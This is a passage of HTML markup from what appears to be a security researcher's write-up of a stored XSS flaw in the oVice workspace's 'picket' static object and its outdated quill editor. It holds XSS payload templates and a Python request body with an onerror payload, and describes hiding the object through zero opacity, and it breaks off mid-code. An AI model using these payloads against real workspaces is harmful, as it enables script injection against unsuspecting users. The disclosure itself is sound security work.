0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAADZElEQVQ4y22RXU8jZRTHJ+qNiZt47xfwG/khNJoYLyTxQmNizF6ZEAHB7RZIlhWiIAsFl4Vt2dJOu7TbdmahL7wMnaXz+kwpnXam0+c8fzNFTTbxJL/885yLX845j1Qplwtaq2nWFbXdel3VrZMVvV7a0cvFst58rern9breOjnRG4qi1xVFLxQKeiqV0h8kHuiJ5EN9cWlRTy4lteRikiUXk5vSSa3W6WiXyKaP0MgvYHtpCkd//oh24xWutTYsXUdLVfFifx+n1SoKsoznmQzm9p7h4GUe180aqkoJh6+OcaYeH0vNk9Mrt9PB/M+/8P31aSpu/0AbiSk6OviL3I5FPYdRKZ+nn+7fp5Isk5zL0e5OitbWVmhna52ebm/Q7tb6eHd7A6nN3/NSuVppm4aJSkGmakGGWkjBv7HAxwJRGGIUjjAKQ0RxDgPYF5co5UtQ5SJ+W13Fw4VZJBbm+MzsLGbnZmWpVqu1mctwuPeUttZWhFJpitGIi3EUgvNIhGGAURQh4hzReIzA99HzeqDRCMfFPBrNUzSaLb76+BHmF+Zk6azeuLyxHTxeWo4OdvfG5cJLbnQMwW4C3A5IuIyB2Tbis7y5uIBjGAj7fYR+H61qBc/lA6hqhu//kcSjZEKWVEXtnjdb+PKLzzEzPQ35KIthMAaxJ2JwtQABgN/egvw+RBhCBAEQZxhiPBggHASIzmd4pC2jf20UpHQ6/Wk6k/lGUdWpYjH/dVY+/RZhzfv1u4/x2ScficDcBEbAoH+L/nCIUTRGOIoQRnfEZwgj4pEAbh1XjoVSOpORWmdnUuP8WooLY/ui/Ox7PFn+isJ+EyKI0HVdWI4Lw7RgWTYMw4QZp2mi0zE463YxYEyWstnsO7lc7l1FUd6LZf1u+0MS0IAhAEaIV/b76LoMjsvgugymZU3EjuNOepZl8+5ND0PmydK/JYSQiCCRwD0irpEASGAiJN8Hc1xYtgPbdiYie4Iz6Zmmxbu93t2Ebwsp5gMS4gJCQAiK4gHJ9zlzXG7ZDrdjHJfbjjN5x9MZphnFwsDzcv8nvEdElpgI4z8GaDCAxzyY8YrMm9zStN1/0pnAej34zKu8JYwB8D4RrRJRnojSAjiMPO+Fd6ll3at21rnU/sO9urpLTTv09Dclr9Wa/xttg6bnv39hfwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Static Picket Object Editor\"\n        title=\"Static Picket Object Editor\"\n        src=\"/static/95b80a0acc65a23481f577e85f0f2a8a/37523/x_24.png\"\n        srcset=\"/static/95b80a0acc65a23481f577e85f0f2a8a/e9ff0/x_24.png 180w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/f21e7/x_24.png 360w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/37523/x_24.png 720w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/302a4/x_24.png 1080w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/48ca3/x_24.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>It was confirmed that the node <code class=\"language-text\">quill</code> was used, and a 1-day attack could be performed using a version less than 1.3.7 that became a security patch.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABsUlEQVQozzWOS2+bQBSFkaoujJnAMMzwGMBgwPIbN06MpVbKoqoUuY/s8/C2StVGVav84XrVH+F7KnC6+HTv4uicz7AcRUwG8OKY8nyBYDCHHxUQIgTnPlw3AHeD7v7/vRNkcf/IuA/LUZ8tRxmM+6+Mvi3h+gnFgwpZWkAlJWSUg4kIlhu2YfQdecJWMG0J5qiusP9SyHhwY/bPDBllr43O0A3guAFpXULkbyCylnPweAbmxbBEDCY0HC/CmachpIbn+mTa8tgOmkx88MKBMZ4uDONFGYwrpGEKHeYI/AyBP0CWVBglBYa6QKGHqOK8Y5gUCIOUHKmJSw0ZDn6Vk3qaDavGYFy12u3S0VW6g9niyILymL57oOxqD/32ntT2DqK5hWpuwZt79LZ7mNs9es0DmZs79Jo9wukWJ8POUkLFI3jJFMz2wKIxsvdfUV4/Urn7hnL3HdHNM/KPPzC6fkS0e6J490Tpp5+Ivvym+OaZstUVtYUHy/EPjKuDiIqDmywOtkz+cC/+O77cUL29QL1Y02y5xmJ5jsW8xny+wmS+onF9QVW9Qbm8pFm9pmo0oX9qwrVR3rHMtgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"quill editor\"\n        title=\"quill editor\"\n        src=\"/static/17d95433845909dba6455a9d31487c93/37523/x_23.png\"\n        srcset=\"/static/17d95433845909dba6455a9d31487c93/e9ff0/x_23.png 180w,\n/static/17d95433845909dba6455a9d31487c93/f21e7/x_23.png 360w,\n/static/17d95433845909dba6455a9d31487c93/37523/x_23.png 720w,\n/static/17d95433845909dba6455a9d31487c93/302a4/x_23.png 1080w,\n/static/17d95433845909dba6455a9d31487c93/07a9c/x_23.png 1440w,\n/static/17d95433845909dba6455a9d31487c93/236d7/x_23.png 1486w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"picket-object-function\" style=\"position:relative;\"><a href=\"#picket-object-function\" aria-label=\"picket object function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Picket Object function</h3>\n<ul>\n<li>Administrator authority (default)</li>\n<li>Members authority.</li>\n<li>Guest authority.</li>\n<li>Visitor Guohan.</li>\n</ul>\n<h2 id=\"vulnerability-description\" style=\"position:relative;\"><a href=\"#vulnerability-description\" aria-label=\"vulnerability description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Description</h2>\n<h3 id=\"client-side-security-check\" style=\"position:relative;\"><a href=\"#client-side-security-check\" aria-label=\"client side security check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Client Side Security Check</h3>\n<p><strong>Contents-Security-Policy</strong></p>\n<ul>\n<li>frame-ancestors <code class=\"language-text\">none</code>\n<ul>\n<li>Defines valid sources for embedding the resource using <code class=\"language-text\">&lt;frame> &lt;iframe> &lt;object> &lt;embed> &lt;applet></code>. Setting this directive to none should be roughly equivalent to <code class=\"language-text\">X-Frame-Options: DENY</code></li>\n</ul>\n</li>\n<li><code class=\"language-text\">script-src</code> , <code class=\"language-text\">object-src</code> Since CSP Policy is not set, external script loading and requesting are possible.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA8UlEQVQoz51QAW7DIAzk/8/cujZRC5gGAgTwTXaWqeumSZulE2cB5zubm414ORFe3wLOl4DrfMN9yVhi+TMoRBjmga/F+G+1tsGMMX68ZH7u+Rueq5QK03tH602hvDXFwbdt2/sxMB4ggnKXUkKMUbnApJgwnWbYycFeHUIgeE9wzsFaCyLpvT5+dCpVa0UIAeQ9aqk62Iz7gnq+olwsGi1g7B/ERc5ZHaS0Yl3X3xf44dgweWCeACJwILDEATSyOHPOg0JQLm5SijpEBsSY9J06/hQsBRwjOGco530/vQ8VkfhySnQRLKUoJK6cxz4PwXe7rHHrLapZ6QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"csp\"\n        title=\"csp\"\n        src=\"/static/9a915c506253e66992b5362ceb9fd3a0/37523/csp-.png\"\n        srcset=\"/static/9a915c506253e66992b5362ceb9fd3a0/e9ff0/csp-.png 180w,\n/static/9a915c506253e66992b5362ceb9fd3a0/f21e7/csp-.png 360w,\n/static/9a915c506253e66992b5362ceb9fd3a0/37523/csp-.png 720w,\n/static/9a915c506253e66992b5362ceb9fd3a0/cda19/csp-.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"problem-with-security-setting-defect-in-quill-editor\" style=\"position:relative;\"><a href=\"#problem-with-security-setting-defect-in-quill-editor\" aria-label=\"problem with security setting defect in quill editor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Problem with security setting defect in quill-editor</h3>\n<ul>\n<li>When selecting an image from a Picket Object installed as a static object, the image is encoded as base 64 and interpreted as an html tag for editing.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAADZElEQVQ4y22RXU8jZRTHJ+qNiZt47xfwG/khNJoYLyTxQmNizF6ZEAHB7RZIlhWiIAsFl4Vt2dJOu7TbdmahL7wMnaXz+kwpnXam0+c8fzNFTTbxJL/885yLX845j1Qplwtaq2nWFbXdel3VrZMVvV7a0cvFst58rern9breOjnRG4qi1xVFLxQKeiqV0h8kHuiJ5EN9cWlRTy4lteRikiUXk5vSSa3W6WiXyKaP0MgvYHtpCkd//oh24xWutTYsXUdLVfFifx+n1SoKsoznmQzm9p7h4GUe180aqkoJh6+OcaYeH0vNk9Mrt9PB/M+/8P31aSpu/0AbiSk6OviL3I5FPYdRKZ+nn+7fp5Isk5zL0e5OitbWVmhna52ebm/Q7tb6eHd7A6nN3/NSuVppm4aJSkGmakGGWkjBv7HAxwJRGGIUjjAKQ0RxDgPYF5co5UtQ5SJ+W13Fw4VZJBbm+MzsLGbnZmWpVqu1mctwuPeUttZWhFJpitGIi3EUgvNIhGGAURQh4hzReIzA99HzeqDRCMfFPBrNUzSaLb76+BHmF+Zk6azeuLyxHTxeWo4OdvfG5cJLbnQMwW4C3A5IuIyB2Tbis7y5uIBjGAj7fYR+H61qBc/lA6hqhu//kcSjZEKWVEXtnjdb+PKLzzEzPQ35KIthMAaxJ2JwtQABgN/egvw+RBhCBAEQZxhiPBggHASIzmd4pC2jf20UpHQ6/Wk6k/lGUdWpYjH/dVY+/RZhzfv1u4/x2ScficDcBEbAoH+L/nCIUTRGOIoQRnfEZwgj4pEAbh1XjoVSOpORWmdnUuP8WooLY/ui/Ox7PFn+isJ+EyKI0HVdWI4Lw7RgWTYMw4QZp2mi0zE463YxYEyWstnsO7lc7l1FUd6LZf1u+0MS0IAhAEaIV/b76LoMjsvgugymZU3EjuNOepZl8+5ND0PmydK/JYSQiCCRwD0irpEASGAiJN8Hc1xYtgPbdiYie4Iz6Zmmxbu93t2Ebwsp5gMS4gJCQAiK4gHJ9zlzXG7ZDrdjHJfbjjN5x9MZphnFwsDzcv8nvEdElpgI4z8GaDCAxzyY8YrMm9zStN1/0pnAej34zKu8JYwB8D4RrRJRnojSAjiMPO+Fd6ll3at21rnU/sO9urpLTTv09Dclr9Wa/xttg6bnv39hfwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\".png\"\n        title=\".png\"\n        src=\"/static/95b80a0acc65a23481f577e85f0f2a8a/37523/x_24.png\"\n        srcset=\"/static/95b80a0acc65a23481f577e85f0f2a8a/e9ff0/x_24.png 180w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/f21e7/x_24.png 360w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/37523/x_24.png 720w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/302a4/x_24.png 1080w,\n/static/95b80a0acc65a23481f577e85f0f2a8a/48ca3/x_24.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>A space for executing javascript may be created using the html tag allowed in the white list as follows.</li>\n<li>Various attacks can be attempted using oVice internal script without space escape.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABXUlEQVQY01WQW2/aQBSE/f95av5DUCKlUvJCG0RTnlJRqOqYixIZX6QQaL3eXYyN8QXvV9ltpfZIo5mHozlnxvJ9n/V6bVr+i9VqhesFaH1CypTdLkbrlGOe43kejjMnDEI2mw1xHCNETJqmZFmGNZlMTL/fZ7f7weGQMhwOubu7xQ9DlKqRssR1M6TMKau6PY793Wa5XKGkIs9zjse84zTNsB6/TBmNHozUe+Q+wX5yGH36jD23USolivYsFyGet+VUVLiuy2K+IDkcaMc0BmNMp8/nM9b02xNfpzOE1vyUiue1x/3oAT94pd0rCkOWQV1DWVb4fsDL8wuBHyAigda6+1QphdYK68PHe3q9Hpu3LdnxxOVln3cXFyRJwu8xfwBVVXXVRFHUGUkpEUJ0HbZ6uxVY4/GY66srprMZjuMwGAx4f3NDJKLOpPknUlGUXVfGNF28pmn+Q12f+QX0gLjJbqc4zwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"exploit-1\"\n        title=\"exploit-1\"\n        src=\"/static/26a9276351ae8a94d3fca48150a1e5ea/37523/exploit-1.png\"\n        srcset=\"/static/26a9276351ae8a94d3fca48150a1e5ea/e9ff0/exploit-1.png 180w,\n/static/26a9276351ae8a94d3fca48150a1e5ea/f21e7/exploit-1.png 360w,\n/static/26a9276351ae8a94d3fca48150a1e5ea/37523/exploit-1.png 720w,\n/static/26a9276351ae8a94d3fca48150a1e5ea/302a4/exploit-1.png 1080w,\n/static/26a9276351ae8a94d3fca48150a1e5ea/010c2/exploit-1.png 1425w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"static-object-function-to-strengthen-vulnerabilities\" style=\"position:relative;\"><a href=\"#static-object-function-to-strengthen-vulnerabilities\" aria-label=\"static object function to strengthen vulnerabilities permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Static-Object function to strengthen vulnerabilities</h3>\n<ul>\n<li>Several functions can be modified when setting up a picket object. <code class=\"language-text\">Color, transparency, location, content, shadow,</code></li>\n<li>If correction authority exists, transparent objects can be created to make the attack impact higher.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">picket_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"object_id\"</span></span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"visitor\"</span><span class=\"token punctuation\">,</span>    \n        <span class=\"token string\">\"width\"</span><span class=\"token punctuation\">:</span>xpos<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"height\"</span><span class=\"token punctuation\">:</span>ypos<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"return\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"Attack Vector\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"shadow\"</span><span class=\"token punctuation\">:</span> false<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"border_color\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"color\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"background_color\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"color\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"border_color_opacity\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"background_color_opacity\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"workspace_id\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"9473\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC/0lEQVQoz2XRW09cVRgG4P1DOvu49vk4s2eGgWpi9NIL9ScQSltTKYMx9arJileV6g/wqqERTK0JknTG4gC1dBhEigU5eGhLDFWKdlxxGlT2bLpeMyNpmrqSJ+vNd/V9eYXPJyd5tVLhX3RUq7xybYpPXznPPx77iA+XR/jg4CB/9eVX+EulPt6by/OsF/DIDXhgOdwxbO6YDvcMq5tzrs+FpNVC9x0+AQ4PgSQB0MKDuz/gxMAJ9Pf348XScYRuAIuY/9EtmMSArhkwjnSyo+kQ2O5uyvmTtJ0cpO0kSdsHBymAdPPOanrq5Mn01OnTaZCNU5WY6TFReSojqal4JCNrT38hbT2mf+7uUSQJ5fv79K9mk6Kd0F+3f6ZvDgzQN157nfblCrToRTR2fFqKYlrwQupbTldguzQ0bOpbLo1MmwoLCwvspx/vsrm5Oba3t8fa7ZStra6xjY1Ndu7cu8y1fRaHMQuKx1kYxcwLssz1skwjFlN1k2m6xYhmMEU3matbTJj/chr3vt/C/MwMttbW8HBnB8v1OtZXbuOt4REosgbPCUGKfZDzBUiGDVHWID2nMzMVAmG2WuX3trf57Nwsv39/mzf/YLzRaPA7S1/zobNlLmZk7rsRt/MlbgURFxXCpSPP5oyscVMhXKhdq2B5ZRWVShU7D35B6/E+6rduoXFzHkPDI5BEBaGXRZDrRSFXgK7q0GQN5FkKgaYQeKoOYXpqEksr66jXG3j4qIlHrRa+W9/AjdoNnBkqQ5RU9GSLKMW96AljFKMcCl4WvunAtxwEHbqF0PXxQhRD+PC986jXF/HB6EVsbW7hn78PcGXiE3w2Po7y2+9AzMjw3RBGvgQjzEKzPaiGA1HRIaoEoqpDVAiOKQSmZkD4dHwcX83UMHbpEm7Wavh2aQlTV69i5vp1nBk62z3ZdyPoxT4ocR6yaXdLkJ/TmVmdUkYvjqKxuIgL71/AN8u38dvvTYxdvoyJiQkMl0cgHW3o5HrguAEkSYWskP/ptGypBP8CV9UEVqMA51QAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"xss-1\"\n        title=\"xss-1\"\n        src=\"/static/5483578dbc9e1c75f8b0363e1f9b86b6/37523/xss-1.png\"\n        srcset=\"/static/5483578dbc9e1c75f8b0363e1f9b86b6/e9ff0/xss-1.png 180w,\n/static/5483578dbc9e1c75f8b0363e1f9b86b6/f21e7/xss-1.png 360w,\n/static/5483578dbc9e1c75f8b0363e1f9b86b6/37523/xss-1.png 720w,\n/static/5483578dbc9e1c75f8b0363e1f9b86b6/302a4/xss-1.png 1080w,\n/static/5483578dbc9e1c75f8b0363e1f9b86b6/07a9c/xss-1.png 1440w,\n/static/5483578dbc9e1c75f8b0363e1f9b86b6/03bcf/xss-1.png 1653w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>In the case of the picket object function, unlike iframe, it can be created only if it has the right to set, but it basically operates throughout the workspace and can attack invisible xss to the user through the following attribute changes.</li>\n</ul>\n<h2 id=\"payload\" style=\"position:relative;\"><a href=\"#payload\" aria-label=\"payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Payload</h2>\n<ul>\n<li>An xss attack was performed within the range of tags designated as whitelist.</li>\n<li>Although not all of them were checked, it was confirmed that the rest of the tags were executed except for <code class=\"language-text\">script tags</code>, and based on this, the payload was created.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> on<span class=\"token operator\">*</span>event<span class=\"token operator\">=</span>javascript <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>&lt;inline-javascript</span><span class=\"token punctuation\">></span></span><span class=\"token plain-text\"> />\n</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>&lt;inline-javascript</span><span class=\"token punctuation\">></span></span><span class=\"token plain-text\"> />\netc ...</span></code></pre></div>\n<ul>\n<li>When a static object is installed within the worskapce, the attribute can be changed if the corresponding modification authority exists.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">picket_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>object_id<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"visitor\"</span><span class=\"token punctuation\">,</span>    \n        <span class=\"token string\">\"width\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">421</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"height\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">371</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"return\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"&lt;p>&lt;img src=\"</span>a<span class=\"token string\">\" onerror=\"</span>prompt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">&lt;/p>\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"shadow\"</span><span class=\"token punctuation\">:</span>true<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"border_color\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"#ffffff\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"background_color\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"#ffffff\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"border_color_opacity\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"background_color_opacity\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"workspace_id\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"9473\"</span>\n<span class=\"token 